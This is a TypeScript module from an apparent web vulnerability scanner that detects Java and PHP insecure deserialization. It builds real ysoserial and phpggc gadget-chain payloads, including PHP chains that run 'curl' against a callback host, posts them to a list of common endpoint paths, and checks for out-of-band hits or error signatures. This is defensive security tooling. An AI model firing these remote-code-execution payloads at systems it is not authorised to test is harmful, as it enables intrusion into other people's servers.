/**
 * Java + PHP insecure deserialization detection.
 *
 * The only prior RCE-via-deserialization coverage (HunterEngine's
 * probeDeserialize) is Node.js-only — two node-serialize IIFE gadgets. There
 * was zero coverage for Java or PHP deserialization, despite both being
 * common, high-severity real-world bug classes.
 *
 * Java uses ysoserial's URLDNS gadget: it needs no vulnerable library on the
 * target's classpath beyond core java.util/java.net (always present), because
 * it exploits HashMap.readObject() calling hashCode() on a java.net.URL key,
 * which triggers a DNS/HTTP lookup during deserialization itself — the same
 * "genuinely unforgeable OOB round-trip" confirmation blind-xxe-probe.ts
 * already established, not a payload/response heuristic.
 *
 * PHP has no equivalent library-independent gadget, so this uses phpggc to
 * generate real gadget chains from libraries commonly present as HTTP-client/
 * logging dependencies regardless of the specific framework (Guzzle, Monolog)
 * — each capable of running a shell command, which is pointed at our OOB
 * callback exactly like the Java path. Neither tool is guaranteed available or
 * guaranteed to pop (classpath/library-version dependent), so both languages
 * fall back to a fingerprint-only tier: a malformed payload in the expected
 * format, checked for a language-specific deserialization *error* signature
 * in the response (a real signal that the input reached readObject()/
 * unserialize(), just not proof of a working gadget) — never a bare substring
 * match, which is exactly the class of bug already fixed once in
 * probeDeserialize's RCE oracle.
 */
import axios from "axios";
import { execFile } from "child_process";
import { promisify } from "util";
import path from "path";
import { existsSync } from "fs";
import logger from "../../utils/logger";
import { callbackServer } from "../oob/callback-server";

const execFileAsync = promisify(execFile);

interface DeserializationVuln {
  endpoint: string;
  language: "java" | "php";
  technique: "ysoserial_urldns" | "phpggc_guzzle_rce1" | "phpggc_monolog_rce4" | "java_error_fingerprint" | "php_error_fingerprint";
  beaconId?: string;
  oobReceived: boolean;
  severity: "critical" | "medium";
  detail: string;
}

interface DeserializationProbeResult {
  endpointsTested: number;
  vulns: DeserializationVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; endpoint: string; raw: DeserializationVuln }>;
}

const CANDIDATE_PATHS = [
  "", "/api", "/deserialize", "/api/deserialize", "/parse", "/api/parse",
  "/import", "/api/import", "/upload", "/api/upload", "/data", "/api/data",
  "/webhook", "/api/webhook", "/object", "/api/object",
];

const YSOSERIAL_JAR = path.join(__dirname, "../../../tools/ysoserial.jar");

// Real Java serialization stream magic bytes (0xACED0005) — used both as the
// prefix ysoserial's own output always starts with, and standalone for the
// fingerprint-only fallback when ysoserial isn't available.
const JAVA_MAGIC = Buffer.from([0xac, 0xed, 0x00, 0x05]);

const JAVA_ERROR_SIGNATURE = /ObjectInputStream|InvalidClassException|StreamCorruptedException|OptionalDataException|java\.io\.\w*Exception|readObject/i;
const PHP_ERROR_SIGNATURE = /unserialize\(\)|Error at offset|__PHP_Incomplete_Class|PHP (Warning|Notice|Fatal error).*unserialize/i;

function ysoserialAvailable(): boolean {
  return existsSync(YSOSERIAL_JAR);
}

let phpggcChecked = false;
let phpggcOk = false;
async function phpggcAvailable(): Promise<boolean> {
  if (phpggcChecked) return phpggcOk;
  phpggcChecked = true;
  try {
    await execFileAsync("phpggc", ["--list"], { timeout: 5000 });
    phpggcOk = true;
  } catch {
    phpggcOk = false;
  }
  return phpggcOk;
}

async function generateYsoserialUrldns(callbackUrl: string): Promise<Buffer | null> {
  try {
    const { stdout } = await execFileAsync(
      "java",
      [
        "--add-opens=java.base/java.net=ALL-UNNAMED",
        "--add-opens=java.base/java.util=ALL-UNNAMED",
        "-jar", YSOSERIAL_JAR, "URLDNS", callbackUrl,
      ],
      { timeout: 15000, maxBuffer: 10 * 1024 * 1024, encoding: "buffer" as BufferEncoding },
    );
    return stdout as unknown as Buffer;
  } catch (err) {
    logger.debug(`[deserialization-prober] ysoserial URLDNS generation failed: ${err}`);
    return null;
  }
}

async function generatePhpggc(chain: string, args: string[]): Promise<string | null> {
  try {
    const { stdout } = await execFileAsync("phpggc", [chain, ...args], {
      timeout: 10000, maxBuffer: 5 * 1024 * 1024,
    });
    const payload = stdout.trim();
    return payload.length > 0 ? payload : null;
  } catch (err) {
    logger.debug(`[deserialization-prober] phpggc ${chain} generation failed: ${err}`);
    return null;
  }
}

class DeserializationProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<DeserializationProbeResult> {
    const base = targetUrl.replace(/\/$/, "");
    const endpoints = CANDIDATE_PATHS.map(p => `${base}${p}`);
    const vulns: DeserializationVuln[] = [];
    const headers = { ...(authHeaders ?? {}) };

    const [hasYsoserial, hasPhpggc] = await Promise.all([
      Promise.resolve(ysoserialAvailable()),
      phpggcAvailable(),
    ]);

    for (const endpoint of endpoints) {
      const javaVuln = await this.tryJava(endpoint, headers, hasYsoserial);
      if (javaVuln) vulns.push(javaVuln);

      const phpVuln = await this.tryPhp(endpoint, headers, hasPhpggc);
      if (phpVuln) vulns.push(phpVuln);
    }

    const hypotheses = vulns.map(v => ({
      vulnClass: "deserialization",
      reasoning: v.detail,
      confidence: v.oobReceived ? 0.9 : 0.55,
      priority: v.oobReceived ? 10 : 7,
      endpoint: v.endpoint,
      // Full detection detail — HunterEngine attaches this to the hypothesis's
      // evidence so the PROBE phase can recognize this hypothesis was already
      // actively confirmed here (a real ysoserial/phpggc gadget chain that
      // fired an OOB callback, or a genuine language-specific deserialization
      // error signature) and skip re-dispatching it to probeDeserialize, whose
      // only payloads are Node.js node-serialize gadgets — irrelevant for
      // Java/PHP — or to nuclei, which has no gadget-chain-generation
      // capability at all.
      raw: v,
    }));

    return { endpointsTested: endpoints.length, vulns, hypotheses };
  }

  private async tryJava(
    endpoint: string,
    headers: Record<string, string>,
    hasYsoserial: boolean,
  ): Promise<DeserializationVuln | null> {
    if (hasYsoserial) {
      const { beaconId, callbackUrl } = callbackServer.generateBeacon();
      try {
        const payload = await generateYsoserialUrldns(callbackUrl);
        if (payload) {
          await axios.post(endpoint, payload, {
            headers: { "Content-Type": "application/x-java-serialized-object", ...headers },
            timeout: 8000,
            validateStatus: () => true,
          });
          const hit = await callbackServer.waitForHit(beaconId, 10000);
          if (hit) {
            const detail = `ysoserial URLDNS gadget triggered a real OOB DNS/HTTP callback at ${endpoint} (beacon: ${beaconId}) — confirmed Java deserialization of attacker-controlled input.`;
            logger.warn("[deserialization-prober] Java deserialization confirmed (OOB)", { endpoint, beaconId });
            return { endpoint, language: "java", technique: "ysoserial_urldns", beaconId, oobReceived: true, severity: "critical", detail };
          }
        }
      } catch (err) {
        logger.debug(`[deserialization-prober] Java OOB attempt error at ${endpoint}: ${err}`);
      } finally {
        callbackServer.cleanup(beaconId);
      }
    }

    // Fingerprint fallback — malformed Java-serialization-shaped bytes, look
    // for a genuine deserialization error signature (not a bare substring).
    try {
      const garbage = Buffer.concat([JAVA_MAGIC, Buffer.from("nettyhunter-fingerprint-probe")]);
      const resp = await axios.post(endpoint, garbage, {
        headers: { "Content-Type": "application/x-java-serialized-object", ...headers },
        timeout: 8000,
        validateStatus: () => true,
      });
      const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
      if (JAVA_ERROR_SIGNATURE.test(body)) {
        const detail = `Endpoint ${endpoint} returned a Java deserialization error signature (${body.match(JAVA_ERROR_SIGNATURE)?.[0]}) in response to malformed serialized input — the backend is attempting real Java deserialization on this input, but no working gadget was confirmed.`;
        logger.debug("[deserialization-prober] Java deserialization surface fingerprinted", { endpoint });
        return { endpoint, language: "java", technique: "java_error_fingerprint", oobReceived: false, severity: "medium", detail };
      }
    } catch (err) {
      logger.debug(`[deserialization-prober] Java fingerprint attempt error at ${endpoint}: ${err}`);
    }
    return null;
  }

  private async tryPhp(
    endpoint: string,
    headers: Record<string, string>,
    hasPhpggc: boolean,
  ): Promise<DeserializationVuln | null> {
    if (hasPhpggc) {
      const chains: Array<{ name: string; technique: DeserializationVuln["technique"]; args: string[] }> = [
        { name: "Guzzle/RCE1", technique: "phpggc_guzzle_rce1", args: [] },
        { name: "Monolog/RCE4", technique: "phpggc_monolog_rce4", args: [] },
      ];
      for (const chain of chains) {
        const { beaconId, callbackUrl } = callbackServer.generateBeacon();
        try {
          const command = `curl -s ${callbackUrl}`;
          const args = chain.name === "Guzzle/RCE1" ? ["system", command] : [command];
          const payload = await generatePhpggc(chain.name, args);
          if (payload) {
            await axios.post(endpoint, payload, {
              headers: { "Content-Type": "text/plain", ...headers },
              timeout: 8000,
              validateStatus: () => true,
            });
            const hit = await callbackServer.waitForHit(beaconId, 10000);
            if (hit) {
              const detail = `phpggc ${chain.name} gadget chain triggered a real OOB callback at ${endpoint} (beacon: ${beaconId}) — confirmed PHP deserialization RCE of attacker-controlled input.`;
              logger.warn("[deserialization-prober] PHP deserialization confirmed (OOB)", { endpoint, chain: chain.name, beaconId });
              return { endpoint, language: "php", technique: chain.technique, beaconId, oobReceived: true, severity: "critical", detail };
            }
          }
        } catch (err) {
          logger.debug(`[deserialization-prober] PHP OOB attempt error at ${endpoint} (${chain.name}): ${err}`);
        } finally {
          callbackServer.cleanup(beaconId);
        }
      }
    }

    // Fingerprint fallback — deliberately malformed serialized PHP, look for
    // a genuine unserialize() error/warning signature.
    try {
      const garbage = 'O:8:"stdClass":99:{s:4:"test";s:5:"hello";}';
      const resp = await axios.post(endpoint, garbage, {
        headers: { "Content-Type": "text/plain", ...headers },
        timeout: 8000,
        validateStatus: () => true,
      });
      const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
      if (PHP_ERROR_SIGNATURE.test(body)) {
        const detail = `Endpoint ${endpoint} returned a PHP unserialize() error signature in response to malformed serialized input — the backend is attempting real PHP deserialization on this input, but no working gadget was confirmed.`;
        logger.debug("[deserialization-prober] PHP deserialization surface fingerprinted", { endpoint });
        return { endpoint, language: "php", technique: "php_error_fingerprint", oobReceived: false, severity: "medium", detail };
      }
    } catch (err) {
      logger.debug(`[deserialization-prober] PHP fingerprint attempt error at ${endpoint}: ${err}`);
    }
    return null;
  }
}

export const deserializationProber = new DeserializationProber();
